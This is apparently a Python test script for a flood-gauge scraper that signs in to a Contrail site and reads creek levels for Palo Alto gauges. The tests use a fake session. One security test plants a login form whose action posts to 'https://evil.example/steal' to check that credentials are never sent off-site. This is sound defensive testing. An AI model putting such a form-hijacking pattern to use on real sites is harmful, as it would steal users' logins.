"""Tests for fetch_sfcjpa.py with a made-up Contrail site (no network). Run: python scripts/test_fetch_sfcjpa.py"""
import datetime as dt
import json
import os
import sys
import tempfile
import urllib.parse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import fetch_sfcjpa as F  # noqa: E402

fails = []


def check(name, ok):
    print(("ok   " if ok else "FAIL ") + name)
    if not ok:
        fails.append(name)


NOW = dt.datetime(2026, 1, 5, 21, 0, tzinfo=dt.timezone.utc)   # Jan 5, 1 PM Pacific
FORM = """<html><body><form id="login" method="POST" action="/login/?r=1">
<input type="hidden" name="csrf_token" value="abc123"><input type="text" name="username" placeholder="Username">
<input type="password" name="password"><input type="checkbox" name="remember_me" value="1"><button type="submit">Sign In</button>
</form></body></html>"""
LIST = "<html><body><main>Locations (16 Total)</main></body></html>"


def series(start_h, vals):
    t0 = int((NOW - dt.timedelta(hours=start_h)).timestamp() * 1000)
    return "<script>var plotdata = [{data:" + json.dumps([[t0 + i * 900000, v] for i, v in enumerate(vals)]) + "}];</script>"


class FakeSession:
    def __init__(self, good_login=True, needs_login=True, down=()):
        self.signed = not needs_login
        self.posts, self.urls, self.good, self.down, self.last_url = [], [], good_login, down, None

    def request(self, url, data=None):
        self.urls.append(url)
        self.last_url = url
        if data is not None:
            self.posts.append((url, data))
            if self.good and data.get("username") == "viewer" and data.get("password") == "pw" and data.get("csrf_token") == "abc123":
                self.signed = True
            return "<html>ok</html>"
        if not self.signed:
            return FORM
        if "/list/" in url:
            return LIST
        dev = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)["devices[]"][0]
        if dev in self.down:
            raise OSError("timed out")
        return series(2, [7.0, 7.2, 7.4, None, 7.6, 7.9, 8.1, 8.28])


G = [{"key": "pope_chaucer", "label": "Pope-Chaucer bridge", "where": "Palo Alto", "kind": "stage", "unit": "ft", "site_id": 18502,
      "device_id": 1, "order": 31, "levels": [13.0, 16.5, 24.0], "camera": "", "note": ""},
     {"key": "west_bayshore", "label": "West Bayshore Road", "where": "", "kind": "stage", "unit": "ft", "site_id": 18503,
      "device_id": 1, "order": 32, "levels": [8.0, 11.0, 15.5], "camera": "", "note": ""}]

f = F.login_form(FORM)
check("sign-in form: posts to its action, keeps the hidden token and remember-me, finds the user and password fields",
      f[0] == "/login/?r=1" and f[1] == "post" and f[2]["csrf_token"] == "abc123" and f[2]["remember_me"] == "1" and f[3] == "username" and f[4] == "password")
check("sign-in form: none on an ordinary page", F.login_form(LIST) is None)

s = FakeSession()
logs = []
r = F.update({}, NOW, s, "viewer", "pw", G, logs.append)
check("signs in with the form's own fields, posted to Contrail only", s.posts and s.posts[0][0] == F.BASE + "/login/?r=1" and s.posts[0][1]["csrf_token"] == "abc123")
check("the log names the form's fields, never the password", logs and "pw" not in " ".join(logs) and "username" in logs[0])
pc = r["gauges"][0]
check("readings: Pacific time, value, UTC; empty values skipped", len(pc["points"]) == 7 and pc["points"][-1][1] == 8.28
      and pc["points"][-1][2] == "2026-01-05T20:45Z" and pc["points"][-1][0] == "2026-01-05 12:45" and pc["latest"] == pc["points"][-1])
check("graph address: the gauge's device and a 50-hour range in Pacific time",
      any("devices%5B%5D=18502%7C1" in u and "data_start=2026-01-03+11%3A00%3A00" in u for u in s.urls))
check("levels and order carried through", pc["levels"] == [13.0, 16.5, 24.0] and r["read"] == 2 and not r["problems"])

# a gauge that can't be read keeps its last readings
s2 = FakeSession(down=("18503|1",))
r2 = F.update(r, NOW + dt.timedelta(minutes=15), s2, "viewer", "pw", G, lambda m: None)
wb = r2["gauges"][1]
check("one gauge down: its last readings kept, marked with the error", wb["error"] and wb["points"] == r["gauges"][1]["points"] and r2["read"] == 1)

# wrong login: problem, previous data kept, nothing posted elsewhere
s3 = FakeSession(good_login=False)
r3 = F.update(r, NOW, s3, "viewer", "wrong", G, lambda m: None)
check("wrong login: a sign-in problem, every gauge keeps its last readings", any("sign-in" in p for p in r3["problems"]) and all(g["points"] for g in r3["gauges"]))
s4 = FakeSession()
r4 = F.update({}, NOW, s4, None, None, G, lambda m: None)
check("no login set: says so, posts nothing", not s4.posts and any("CONTRAIL_USER" in p for p in r4["problems"]))
s5 = FakeSession(needs_login=False)
r5 = F.update({}, NOW, s5, None, None, G, lambda m: None)
check("no sign-in asked for: reads without one", not s5.posts and r5["read"] == 2)

# a form that posts off-site is never sent the login
class OffSite(FakeSession):
    def request(self, url, data=None):
        if data is None and not self.signed:
            self.last_url = url
            return FORM.replace('action="/login/?r=1"', 'action="https://evil.example/steal"')
        return super().request(url, data)
s6 = OffSite()
r6 = F.update({}, NOW, s6, "viewer", "pw", G, lambda m: None)
check("security: a sign-in form that posts to another site is never sent the login", not s6.posts and any("other than Contrail" in p for p in r6["problems"]))
try:
    F.Session().request("https://evil.example/")
    check("security: the session only reads Contrail", False)
except ValueError:
    check("security: the session only reads Contrail", True)

# the gauge list
gs, probs = F.read_gauges()
keys = [g["key"] for g in gs]
check("sfcjpa_gauges.csv: rain, flows, Stanford, the three Palo Alto gauges with levels, the tide; no problems",
      not probs and keys[:3] == ["rain_wunderlich", "rain_windyhill", "rain_trappers"] and {"waverley", "pope_chaucer", "west_bayshore", "mayfield_tide"} <= set(keys)
      and [g for g in gs if g["key"] == "pope_chaucer"][0]["levels"] == [13.0, 16.5, 24.0])
with tempfile.NamedTemporaryFile("w", suffix=".csv", delete=False) as tf:
    tf.write("key,label,where,kind,unit,site_id,device_id,order,stay_alert_ft,ready_ft,likely_ft,camera_url,note\n"
             "ok,A,,stage,ft,1,1,1,8,11,15,,\nBad Key,B,,stage,ft,1,1,2,,,,,\nc,C,,weird,ft,1,1,3,,,,,\nd,D,,stage,ft,1,1,4,9,8,15,,\n"
             "e,E,,stage,ft,1,1,5,,,,http://x/cam.jpg,\n")
gs2, p2 = F.read_gauges(tf.name)
check("sfcjpa_gauges.csv: bad keys, kinds and levels refused with the row; http camera dropped", [g["key"] for g in gs2] == ["ok", "e"] and len(p2) == 4 and gs2[1]["camera"] == "")
check("series parser: ignores non-numbers", F.parse_series('[[1767600000000,"x"],[1767600900000,2.5]]') and len(F.parse_series('x [[1767600000000,1],[1767600900000,null]] y')) == 1)

print("\n" + ("All passed" if not fails else f"{len(fails)} failed"))
sys.exit(1 if fails else 0)
